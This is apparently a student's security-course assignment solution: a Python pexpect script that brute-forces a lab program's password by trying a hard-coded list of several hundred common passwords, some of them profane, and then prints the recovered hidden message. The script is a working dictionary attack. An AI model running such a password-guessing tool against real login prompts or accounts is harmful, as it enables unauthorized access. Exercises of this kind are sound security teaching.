
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 4 solution explanation
========================================================================

### how I found the vulnerability
* I analyzed the vulnerable program's source code `task4-vuln.c` and found that
    there was a comment saying ".. I hope I picked a strong password :)" and
    related it to the 'bad-passwords.txt'. Therefore I figured that its
    a weak/common password

### how the script works
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I have a loop that starts the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`,
    which sends one password at a time in the 'bad-passwords.txt' file (hard coded in this script) until we get the correct one 
    (starting the vulnerable executable over and over again and sending different `passwords` in 'bad-passwords' each time
    until we retreive the correct password).
* Once the password is obtained I retreive the hidden message and output it.
"""

import os
import sys
from pexpect import popen_spawn
import pexpect

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"

BAD_PASSWORDS = '''
0000
00000
000000
0000000
00000000
0000000000
007007
010101
010203
012345
0123456
0123456789
098765
0987654321
100
101010
102030
1029384756
111
1111
11111
111111
1111111
11111111
1111111111
111222
112233
11223344
1122334455
1123581321
1212
121212
12121212
123
123123
123123123
123123a
123321
1234
12341234
12344321
12345
123451
1234512345
1234554321
123456
1234560
1234561
1234567
12345678
123456789
1234567890
1234567891
12345678910
123456789a
123456789q
12345678a
1234567a
123456a
123456aa
123456abc
123456q
12345a
12345q
12345qwert
12345qwerty
1234abcd
1234qwer
123654
123654789
123698745
123789
123abc
123asd
123hfjdk147
123qwe
123qwe123
123qweasd
123qweasdzxc
124578
12qwaszx
131313
1314520
134679
135790
141414
142536
1464688081
147258
147258369
147852
147852369
147896325
151515
159159
159357
159753
159753qq
159951
1a2b3c
1a2b3c4d
1q2w3e
1q2w3e4r
1q2w3e4r5t
1q2w3e4r5t6y
1qa2ws3ed
1qaz2wsx
1qaz2wsx3edc
1qazxsw2
2012comeer
202020
212121
21212121
2222
222222
232323
246810
252525
321321
321654
333333
4444
444444
456123
456456
456789
456852
4815162342
50cent
5201314
54321
5555
55555
555555
654321
666666
696969
6V21wbgad
741852
741852963
753951
7654321
7758521
7777
777777
7777777
786786
789456
789456123
789789
852456
8675309
87654321
888888
88888888
951753
963852741
987654
987654321
9876543210
999999
999999999
a12345
a123456
a1234567
a12345678
a123456789
a1b2c3
a1b2c3d4
a1s2d3f4
aa123456
aaaa
aaaaa
aaaaaa
aaaaaaaa
abc123
abc12345
abc123456
abcd1234
Abcd1234
abcdef
abcdefg
abcdefgh
abigail
access
adidas
admin
admin123
adrian
albert
alejandro
alex
alexander
alexandra
alexandre
alexis
alicia
alyssa
amanda
america
anderson
andrea
andreas
andrei
andrew
angel
angel1
angela
angelica
angelina
angelo
angels
anhyeuem
animal
anthony
anthony1
antonio
aobo2010
apollo
apple
apples
arsenal
arsenal1
arthur
asd
asd123
asd123456
asdasd
asdasd123
asdasdasd
asdf
asdf123
asdf1234
asdf12345
asdfasdf
asdfg
asdfgh
asdfghjk
asdfghjkl
asdqwe123
ashley
assassin
asshole
audrey
august
austin
australia
avatar
awesome
azerty
azertyuiop
baby
babygirl
badboy
bailey
baili123com
banana
bananas
bandit
barbara
barbie
barcelona
barney
baseball
baseball1
basketball
batman
bearshare
beautiful
beauty
benjamin
bestfriend
bhf
bianca
bigdaddy
bismillah
bitch
biteme
blabla
black
blahblah
blessed
Blink123
blink182
bond007
bonjour
bonnie
booboo
boomer
boston
brandon
brandon1
brandy
brenda
brittany
brooklyn
bubbles
buddy
bulldog
bullshit
buster
butter
butterfly
california
calvin
camaro
cambiami
cameron
camille
canada
cancer
carlos
carmen
carolina
caroline
carter
casper
cassie
catherine
celine
celtic
champion
chance
changeme
charles
charlie
charlie1
charlotte
cheese
chelsea
chelsea1
cherry
chester
cheyenne
chicago
chicken
chicken1
chocolate
chouchou
chris
chris1
christ
christian
christina
christine
christopher
claire
claudia
cme2012
cocacola
coffee
comeon11
compaq
computer
computer1
connor
cookie
cookies
cool
cooper
copper
corvette
coucou
courtney
cowboy
cowboys
creative
cricket
cristina
crossfire
crystal
cupcake
D1lakiss
dakota
dallas
damian
dancer
daniel
daniela
danielle
darkness
david
debbie
december
demon1q2w3e
demon1q2w3e4r
demon1q2w3e4r5t
denise
dennis
destiny
dexter
diablo
diamond
disney
doctor
dolphin
dolphins
domino
donald
doudou
dragon
dragon1
dragonball
dreams
drowssap
eagles
edward
einstein
element
elephant
elizabeth
eminem
emmanuel
exigent
Exigent
facebook
falcon
family
fantasy
fashion
fatima
fender
fernando
ferrari
ficken
fishing
florence
florian
florida
flower
flowers
fluffy
football
football1
forever
france
francis
frankie
freddy
freedom
freedom1
friend
friends
friendster
fuck
fucker
fuckme
fuckoff
fuckyou
fuckyou1
fuckyou2
gabriel
gandalf
gangster
garfield
gateway
gemini
genesis
genius
george
gfhjkm
ghbdtn
ginger
golden
golfcourse
google
gracie
green
greenday
Groupd2013
guitar
gundam
hacker
hahaha
hallo
hallo123
hammer
hamster
hannah
happy
hardcore
harley
harrypotter
harvey
heather
heaven
hello
hello1
hello123
hellokitty
helpme
hesoyam
hg0209
hiphop
hitman
hockey
honey
horses
hotdog
hotmail
hottie
hunter
i
icecream
iceman
ihateyou
iloveme
iloveu
iloveyou
iloveyou1
iloveyou2
india123
indian
Indya123
internet
inuyasha
isabella
isabelle
jackass
jackie
jackson
jaguar
jakjak
james
january
jasmin
jasmine
jasmine1
jason
jasper
jeffrey
jennifer
jeremy
jerome
jessica
jessica1
jessie
jesus
jesus1
john
johnny
johnson
jonathan
jordan
jordan23
joseph
joshua
julian
junior
jupiter
justin
justinbieber
justine
juventus
karina
kawasaki
kenneth
kevin
killer
killer123
kimberly
kingkong
kissme
kitten
kitty
knight
krishna
kristina
ladybug
lakers
lalala
lauren
legend
legolas
leonardo
letmein
lincogo1
linkinpark
liverpool
liverpool1
lizottes
logitech
lol
lol123
lolipop
lolita
lollipop
lollol
london
lorenzo
louise
loulou
love
love123
lovelove
lovely
loveme
loverboy
lovers
loveyou
lucky
lucky1
m
madison
maganda
maggie
magic
mahalkita
mahalko
mamapapa
manchester
manuel
manutd
mar
marcel
marcus
maria
marie
marina
marine
marlboro
marley
marseille
martin
martina
marvin
maryjane
master
matrix
matthew
matthew1
maverick
maximus
maxwell
megaman
megaparol12345
melanie
melissa
mercedes
merlin
metallica
mexico
michael
michael1
michelle
mickey
microsoft
midnight
miguel
mike
miller
millie
minecraft
minnie
mmmmmm
mnbvcxz
money
monica
monika
monkey
monkey1
monster
montana
morgan
motdepasse
mother
motorola
muffin
murphy
music
mustang
mylove
myspace1
n
N0=Acc3ss
naruto
nascar
natalia
natalie
natasha
nathan
nelson
never
newpass
newyork
nicholas
nicolas
nicole
nigger
nikita
nintendo
nirvana
nissan
nks230kjs82
nonmember
nothing
november
nyq28Giz1Z
oblivion
october
oliver
olivia
online
orange
orlando
p
pa55word
pakistan
pamela
pantera
panther
paradise
parker
parola
pass
pass123
pass1234
passion
passw0rd
Passw0rd
<password>
password
Password
PASSWORD
password1
Password1
password12
password123
password2
passwort
patricia
patrick
pauline
peaches
peanut
penguin
people
pepper
peter
phantom
phoenix
pierre
pikachu
pk3x7w9W
playboy
player
please
pogiako
pokemon
pokemon1
pokemon123
police
polska
poohbear
pookie
poop
poopoo
popcorn
porsche
portugal
potter
precious
pretty
prince
princess
princess1
pumpkin
purple
pussy
q1w2e3
q1w2e3r4
q1w2e3r4t5
q1w2e3r4t5y6
qaz123
qazqaz
qazwsx
qazwsx123
qazwsxedc
qazxsw
qq123456
qqqqqq
qqww1122
qwaszx
qwe
qwe123
qweasd
qweasd123
qweasdzxc
qweqwe
qwer
qwer1234
qwerasdf
qwert
qwert123
qwert12345
qwerty
qwerty1
qwerty12
qwerty123
qwerty1234
qwerty12345
qwerty123456
qwerty321
qwertyu
qwertyui
qwertyuiop
qwertz
R9lw4j8khX
rabbit
rachel
rafael
ragnarok
raiders
rainbow
ranger
rangers
raymond
realmadrid
rebecca
red123
redsox
remember
rental
ricardo
richard
robert
roberto
rocket
rockstar
ronaldo
rosebud
rr123456rr
runescape
rush2112
ryan
sabrina
sakura
samantha
samson
samsung
samsung1
samuel
sanane
sandra
santiago
sarah
sasuke
savannah
sayang
scarface
school
scooby
scooter
scorpio
scorpion
sebastian
secret
security
september
sexy
shadow
shannon
sharon
shelby
shopping
shorty
siemens
sierra
silver
simone
simple
simpsons
skater
skyline
slayer
slipknot
smokey
snickers
sniper
snoopy
snowball
soccer
softball
soleil
sophia
sophie
sparky
speedy
spencer
spider
spiderman
spirit
spongebob
ssssss
stargate
startfinding
startrek
starwars
starwars1
Status
steelers
stefan
stella
stephanie
stephen
sterling
steven
strawberry
stupid
success
summer
sunflower
sunshine
sunshine1
super123
superman
superman1
superstar
sweetie
sweety
swordfish
sydney
system
tamara
taylor
teacher
Telechargement
tennis
teresa
test
test123
test1234
testing
thomas
thunder
tiffany
tiger
tigers
tigger
timothy
tinkerbell
tintin
toyota
travis
trinity
tristan
trustno1
tucker
turtle
tweety
twilight
undertaker
unicorn
united
valentin
valentina
vampire
vanessa
vegeta
veronica
victor
victoria
vincent
walter
warcraft
warrior
welcome
welcome1
westside
whatever
william
william1
williams
willow
wilson
windows
winner
winnie
winston
winter
wizard
woaini
wow12345
xavier
xbox360
xxxxxx
yamaha
yankees
yellow
youbye123
zachary
zaq12wsx
zxc123
zxcvbn
zxcvbnm
zxcvbnm1
zxcvbnm123
zzzzzz
'''


class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()


def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p


def main(execname):
    """exploit the vulnerable executable using pexpect"""

    try:
        
        # print(BAD_PASSWORDS) # debug
        
        # put each `bad passwords` into an array
        bad_passwords_array = BAD_PASSWORDS.split()
        # print(bad_passwords_array)  # debug
        
        password = ""
                
        # try all the bad passwords in the array until we get the hidden message 
        # or we run out of passwords to check
        for index in range(0, len(bad_passwords_array)):
            
            # start the vulnerable program
            # since popen() is not using pty, we need to use stdbuf(1)
            # to disable output buffering
            process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)
            
            # wait for the password prompt
            process.expect_exact("Password:")
            password_to_try = bad_passwords_array[index] 
            process.sendline(password_to_try)
            # print(f"password tried: {bad_passwords_array[index]}")  # debug
            
            try:
                # see if we entered the right password
                process.expect_exact("Password does not match! Bye.")
                continue    # try the next one
            except Exception:
                # password was found
                # print(f"---password found! {bad_passwords_array[index]}")   # debug
                password = password_to_try
                process.kill(True)
                break
        
        # start the vulnerable program
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)
        process.expect_exact("Password:")   # wait for password prompt
        process.sendline(password)          # send the password
        
        # recover the hidden message
        # notice that with popen_spawn we can use \n line endings
        process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
        process.expect_exact("-----END HIDDEN MESSAGE-----")
        hidden_message = process.before.decode("ascii").rstrip()
        # optional: read the remaining output of the program one line at a time until <EOF>
        process.expect(pexpect.EOF, timeout=8)

        process.kill(True)
        # print out the recovered hidden message
        print("Recovered hidden message:", hidden_message)
        
    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
